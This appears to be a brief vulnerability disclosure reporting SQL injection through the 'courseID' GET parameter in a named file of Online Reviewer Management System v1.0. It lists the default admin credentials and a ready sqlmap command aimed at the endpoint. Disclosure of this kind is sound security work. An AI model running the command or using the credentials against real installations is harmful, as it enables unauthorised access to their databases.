# Online Reviewer Management System v1.0 by janobe has SQL injection

BUG_Author: crazychen123

Accessing admin accounts: Username: admin / Password: admin

Vulnerability File: reviewer_0/admins/assessments/course/course-update.php

Parameter "courseID" (GET), exists SQL injection vulnerability

sqlmap command: sqlmap -u "ip/reviewer_0/admins/assessments/course/course-update.php?courseID=1"

sqlmap injection result

![image](https://github.com/hundanchen69/pic/blob/main/injectresult.png)
